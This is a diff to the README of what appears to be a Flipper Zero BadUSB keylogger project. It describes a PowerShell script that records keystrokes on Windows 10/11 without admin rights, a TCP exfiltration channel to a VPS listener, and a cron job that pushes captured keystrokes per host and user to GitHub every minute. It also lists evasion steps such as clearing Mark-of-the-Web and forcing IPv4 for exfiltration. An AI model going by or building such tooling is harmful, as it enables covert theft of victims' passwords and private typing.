@@ -4,24 +4,29 @@ Flipper Zero BadUSB loads `keylogger.ps1` from this repo and sends keystrokes to
 
 Target: **Windows 10 and Windows 11**, Windows PowerShell **5.1** (built-in). No admin required.
 
+## GitHub captures (every minute)
+
+```text
+captures/{host}/{user}/{YYYY-MM-DD}/{HH-MM}.txt
+```
+
+- One folder per machine host, per Windows user
+- One file per UTC minute (appended during that minute)
+- VPS cron runs `server/github_sync.sh` every minute → push to this repo
+- Old `live.log` imported under `captures/_migrated/legacy/`
+
+## Language
+
+`keylogger.ps1` uses **foreground window HKL** + `ToUnicodeEx` + `GetKeyboardState` so RU/EN (and other layouts) resolve to real characters. Layout switches appear as `[LANG:0419|ru-RU]`.
+
 | File | Role |
 |------|------|
-| `keylogger.ps1` | Key poll (ToUnicode + layout) + TCP exfil |
-| `payload.txt` | BadUSB injector (visible window, 3s delays) |
-| `payload_enc.txt` | Alternate encoded injector via `cmd start` |
-| `server/receiver.py` | TCP listener (Linux VPS) |
-| `server/receiver.ps1` | TCP listener (Windows) |
-
-## Win10/11 adaptations
-
-- Full path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (avoids Windows Terminal / `pwsh` hijack on Win11)
-- TLS 1.2 + TLS 1.3 when available
-- Download: `WebClient` → `Invoke-WebRequest` fallback
-- `Unblock-File` / clear Zone.Identifier (MOTW)
-- TCP exfil forced **IPv4** (dual-stack stalls)
-- Single-instance mutex (no process stack on re-run)
-- `ToUnicodeEx` for current keyboard layout
-- Banner includes OS caption + build + PS version
+| `keylogger.ps1` | Language-aware keys + meta packets + TCP |
+| `payload.txt` | BadUSB injector (3s delays) |
+| `payload_enc.txt` | Encoded alternate injector |
+| `server/receiver.py` | TCP → captures tree + live.log |
+| `server/github_sync.sh` | Minute sync to GitHub |
+| `captures/` | Synced keylog files |
 
 ## Raw URL
 
